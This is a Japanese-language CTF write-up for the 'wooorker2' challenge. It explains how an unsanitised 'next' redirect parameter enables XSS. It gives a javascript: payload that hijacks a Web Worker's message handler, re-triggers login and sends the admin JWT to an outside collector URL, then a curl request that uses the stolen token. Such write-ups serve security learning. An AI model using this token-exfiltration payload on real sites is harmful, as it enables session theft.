# writeup
wooorkerの続き、`admin`のJWTを窃取する問題。

wooorkerとの違いはリダイレクト先にJWTがクエリパラメータではなく、ハッシュで渡される点。

ハッシュはJWTはバックエンド側に送信されないため、wooorkerと同様の解法では解けない。

```:js
if (next) {
    window.location.href = next.includes('token=') ? next: `${next}#token=${token}`;
} else {
    window.location.href = `/#token=${token}`;
}
```

クエリパラメータ`next`がそのまま`location.href`に渡されているため、XSSによるJavaScriptの実行は可能。

しかし、フォームの入力は削除されているため、DOM要素から直接パスワードを取得することはできない。

```:js
function login() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
    loginWorker.postMessage({ username, password });
}
```

改めて、`main.js`を見直すとユーザー名とパスワードをバックエンドに送信し、JWTを受信する処理はWorker内で行われることがわかる。

```:js
const loginWorker = new Worker('login.js');
```

`login.js`は以下で、受け取ったJWTを`main.js`に[Worker.postMessage()](https://developer.mozilla.org/ja/docs/Web/API/Worker/postMessage)で送信する。

```
let username, password;

onmessage = async function(event) {
    if(!username) username = event.data.username;
    if(!password) password = event.data.password;

    try {
        const response = await fetch('/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ username, password })
        });
        const result = await response.json();

        if (response.ok) {
            postMessage({ token: result.token });
        } else {
            postMessage({ token: '', error: result.error });
        }
    } catch (error) {
        postMessage({ token: '', error: 'Error logging in.' });
    }
};
```

そこで、XSSにより、`loginWorker`からのメッセージを受信するリスナーを設置することを考える。`username`と`password`はWorker内で保存されているため、`login`関数を再度呼び出せばログインは可能である。

以下をクローラーに送信することで`loginWorker`からのメッセージを受信するリスナーを設置し、`login`関数を呼び出して、リスナーが受け取ったJWTを自身のサーバに送信することができる。

```
login?next=javascript:loginWorker.onmessage=function(event){fetch(`https://[yours].m.pipedream.net?token=${event.data.token}`)};login();
```

最後に取得したJWTを送信することでflagが得られる。

```
curl -H "Authorization: Bearer [admin JWT]" https://wooorker2.quals.beginners.seccon.jp/flag
{"flag":"ctf4b{x55_50m371m35_m4k35_w0rk3r_vuln3r4bl3}"}
```

